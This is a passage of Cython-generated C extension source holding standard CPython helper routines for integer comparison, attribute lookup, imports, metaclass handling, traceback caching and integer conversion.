                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK)) | (digits[2] != ((uintval >> (2 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
#if PyLong_SHIFT * 1 < SIZEOF_LONG*8
        if (uintval >> (PyLong_SHIFT * 1)) {
            unequal = (size != 2) || (digits[0] != (uintval & (unsigned long) PyLong_MASK))
                 | (digits[1] != ((uintval >> (1 * PyLong_SHIFT)) & (unsigned long) PyLong_MASK));
        } else
#endif
            unequal = (size != 1) || (((unsigned long) digits[0]) != (uintval & (unsigned long) PyLong_MASK));
        if (unequal == 0) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
        if ((double)a == (double)b) Py_RETURN_TRUE; else Py_RETURN_FALSE;
    }
    return (
        PyObject_RichCompare(op1, op2, Py_EQ));
}

 
static CYTHON_INLINE PyObject *__Pyx_GetAttr(PyObject *o, PyObject *n) {
#if CYTHON_USE_TYPE_SLOTS
#if PY_MAJOR_VERSION >= 3
    if (likely(PyUnicode_Check(n)))
#else
    if (likely(PyString_Check(n)))
#endif
        return __Pyx_PyObject_GetAttrStr(o, n);
#endif
    return PyObject_GetAttr(o, n);
}

 
static PyObject* __Pyx_Globals(void) {
    Py_ssize_t i;
    PyObject *names;
    PyObject *globals = __pyx_d;
    Py_INCREF(globals);
    names = PyObject_Dir(__pyx_m);
    if (!names)
        goto bad;
    for (i = PyList_GET_SIZE(names)-1; i >= 0; i--) {
#if CYTHON_COMPILING_IN_PYPY
        PyObject* name = PySequence_ITEM(names, i);
        if (!name)
            goto bad;
#else
        PyObject* name = PyList_GET_ITEM(names, i);
#endif
        if (!PyDict_Contains(globals, name)) {
            PyObject* value = __Pyx_GetAttr(__pyx_m, name);
            if (!value) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                goto bad;
            }
            if (PyDict_SetItem(globals, name, value) < 0) {
#if CYTHON_COMPILING_IN_PYPY
                Py_DECREF(name);
#endif
                Py_DECREF(value);
                goto bad;
            }
        }
#if CYTHON_COMPILING_IN_PYPY
        Py_DECREF(name);
#endif
    }
    Py_DECREF(names);
    return globals;
bad:
    Py_XDECREF(names);
    Py_XDECREF(globals);
    return NULL;
}

 
#if PY_MAJOR_VERSION >= 3 && !CYTHON_PEP489_MULTI_PHASE_INIT
static int __Pyx_SetPackagePathFromImportLib(PyObject *module_name) {
    PyObject *importlib, *osmod, *ossep, *parts, *package_path;
    PyObject *file_path = NULL;
    int result;
    PyObject *spec;
    importlib = PyImport_ImportModule("importlib.util");
    if (unlikely(!importlib))
        goto bad;
    spec = PyObject_CallMethod(importlib, "find_spec", "(O)", module_name);
    Py_DECREF(importlib);
    if (unlikely(!spec))
        goto bad;
    file_path = PyObject_GetAttrString(spec, "origin");
    Py_DECREF(spec);
    if (unlikely(!file_path))
        goto bad;
    if (unlikely(PyObject_SetAttrString(__pyx_m, "__file__", file_path) < 0))
        goto bad;
    osmod = PyImport_ImportModule("os");
    if (unlikely(!osmod))
        goto bad;
    ossep = PyObject_GetAttrString(osmod, "sep");
    Py_DECREF(osmod);
    if (unlikely(!ossep))
        goto bad;
    parts = PyObject_CallMethod(file_path, "rsplit", "(Oi)", ossep, 1);
    Py_DECREF(file_path); file_path = NULL;
    Py_DECREF(ossep);
    if (unlikely(!parts))
        goto bad;
    package_path = Py_BuildValue("[O]", PyList_GET_ITEM(parts, 0));
    Py_DECREF(parts);
    if (unlikely(!package_path))
        goto bad;
    goto set_path;
bad:
    PyErr_WriteUnraisable(module_name);
    Py_XDECREF(file_path);
    PyErr_Clear();
    package_path = PyList_New(0);
    if (unlikely(!package_path))
        return -1;
set_path:
    result = PyObject_SetAttrString(__pyx_m, "__path__", package_path);
    Py_DECREF(package_path);
    return result;
}
#endif

 
#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static PyObject *__Pyx_RaiseGenericGetAttributeError(PyTypeObject *tp, PyObject *attr_name) {
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, attr_name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(attr_name));
#endif
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name) {
    PyObject *descr;
    PyTypeObject *tp = Py_TYPE(obj);
    if (unlikely(!PyString_Check(attr_name))) {
        return PyObject_GenericGetAttr(obj, attr_name);
    }
    assert(!tp->tp_dictoffset);
    descr = _PyType_Lookup(tp, attr_name);
    if (unlikely(!descr)) {
        return __Pyx_RaiseGenericGetAttributeError(tp, attr_name);
    }
    Py_INCREF(descr);
    #if PY_MAJOR_VERSION < 3
    if (likely(PyType_HasFeature(Py_TYPE(descr), Py_TPFLAGS_HAVE_CLASS)))
    #endif
    {
        descrgetfunc f = Py_TYPE(descr)->tp_descr_get;
        if (unlikely(f)) {
            PyObject *res = f(descr, obj, (PyObject *)tp);
            Py_DECREF(descr);
            return res;
        }
    }
    return descr;
}
#endif

 
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

 
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {
    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);
    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Format(PyExc_ImportError,
        #if PY_MAJOR_VERSION < 3
            "cannot import name %.230s", PyString_AS_STRING(name));
        #else
            "cannot import name %S", name);
        #endif
    }
    return value;
}

 
static PyObject *__Pyx_CalculateMetaclass(PyTypeObject *metaclass, PyObject *bases) {
    Py_ssize_t i, nbases = PyTuple_GET_SIZE(bases);
    for (i=0; i < nbases; i++) {
        PyTypeObject *tmptype;
        PyObject *tmp = PyTuple_GET_ITEM(bases, i);
        tmptype = Py_TYPE(tmp);
#if PY_MAJOR_VERSION < 3
        if (tmptype == &PyClass_Type)
            continue;
#endif
        if (!metaclass) {
            metaclass = tmptype;
            continue;
        }
        if (PyType_IsSubtype(metaclass, tmptype))
            continue;
        if (PyType_IsSubtype(tmptype, metaclass)) {
            metaclass = tmptype;
            continue;
        }
        PyErr_SetString(PyExc_TypeError,
                        "metaclass conflict: "
                        "the metaclass of a derived class "
                        "must be a (non-strict) subclass "
                        "of the metaclasses of all its bases");
        return NULL;
    }
    if (!metaclass) {
#if PY_MAJOR_VERSION < 3
        metaclass = &PyClass_Type;
#else
        metaclass = &PyType_Type;
#endif
    }
    Py_INCREF((PyObject*) metaclass);
    return (PyObject*) metaclass;
}

 
static PyObject *__Pyx_Py3MetaclassPrepare(PyObject *metaclass, PyObject *bases, PyObject *name,
                                           PyObject *qualname, PyObject *mkw, PyObject *modname, PyObject *doc) {
    PyObject *ns;
    if (metaclass) {
        PyObject *prep = __Pyx_PyObject_GetAttrStr(metaclass, __pyx_n_s_prepare);
        if (prep) {
            PyObject *pargs = PyTuple_Pack(2, name, bases);
            if (unlikely(!pargs)) {
                Py_DECREF(prep);
                return NULL;
            }
            ns = PyObject_Call(prep, pargs, mkw);
            Py_DECREF(prep);
            Py_DECREF(pargs);
        } else {
            if (unlikely(!PyErr_ExceptionMatches(PyExc_AttributeError)))
                return NULL;
            PyErr_Clear();
            ns = PyDict_New();
        }
    } else {
        ns = PyDict_New();
    }
    if (unlikely(!ns))
        return NULL;
    if (unlikely(PyObject_SetItem(ns, __pyx_n_s_module, modname) < 0)) goto bad;
    if (unlikely(PyObject_SetItem(ns, __pyx_n_s_qualname, qualname) < 0)) goto bad;
    if (unlikely(doc && PyObject_SetItem(ns, __pyx_n_s_doc, doc) < 0)) goto bad;
    return ns;
bad:
    Py_DECREF(ns);
    return NULL;
}
static PyObject *__Pyx_Py3ClassCreate(PyObject *metaclass, PyObject *name, PyObject *bases,
                                      PyObject *dict, PyObject *mkw,
                                      int calculate_metaclass, int allow_py2_metaclass) {
    PyObject *result, *margs;
    PyObject *owned_metaclass = NULL;
    if (allow_py2_metaclass) {
        owned_metaclass = PyObject_GetItem(dict, __pyx_n_s_metaclass);
        if (owned_metaclass) {
            metaclass = owned_metaclass;
        } else if (likely(PyErr_ExceptionMatches(PyExc_KeyError))) {
            PyErr_Clear();
        } else {
            return NULL;
        }
    }
    if (calculate_metaclass && (!metaclass || PyType_Check(metaclass))) {
        metaclass = __Pyx_CalculateMetaclass((PyTypeObject*) metaclass, bases);
        Py_XDECREF(owned_metaclass);
        if (unlikely(!metaclass))
            return NULL;
        owned_metaclass = metaclass;
    }
    margs = PyTuple_Pack(3, name, bases, dict);
    if (unlikely(!margs)) {
        result = NULL;
    } else {
        result = PyObject_Call(metaclass, margs, mkw);
        Py_DECREF(margs);
    }
    Py_XDECREF(owned_metaclass);
    return result;
}

 
#ifndef CYTHON_CLINE_IN_TRACEBACK
static int __Pyx_CLineForTraceback(CYTHON_UNUSED PyThreadState *tstate, int c_line) {
    PyObject *use_cline;
    PyObject *ptype, *pvalue, *ptraceback;
#if CYTHON_COMPILING_IN_CPYTHON
    PyObject **cython_runtime_dict;
#endif
    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        (void) PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

 
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

 
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = NULL;
    PyObject *py_funcname = NULL;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_srcfile = NULL;
    py_srcfile = PyString_FromString(filename);
    if (!py_srcfile) goto bad;
    #endif
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        if (!py_funcname) goto bad;
        funcname = PyUnicode_AsUTF8(py_funcname);
        if (!funcname) goto bad;
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        if (!py_funcname) goto bad;
        #endif
    }
    #if PY_MAJOR_VERSION < 3
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes,  
        __pyx_empty_tuple,  
        __pyx_empty_tuple,  
        __pyx_empty_tuple,  
        __pyx_empty_tuple,  
        __pyx_empty_tuple,  
        py_srcfile,    
        py_funcname,   
        py_line,
        __pyx_empty_bytes   
    );
    Py_DECREF(py_srcfile);
    #else
    py_code = PyCode_NewEmpty(filename, funcname, py_line);
    #endif
    Py_XDECREF(py_funcname);   
    return py_code;
bad:
    Py_XDECREF(py_funcname);
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_srcfile);
    #endif
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject *ptype, *pvalue, *ptraceback;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) {
             
            Py_XDECREF(ptype);
            Py_XDECREF(pvalue);
            Py_XDECREF(ptraceback);
            goto bad;
        }
        __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,             
        py_code,            
        __pyx_d,     
        0                   
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

 
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

 
#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

 
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

 
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
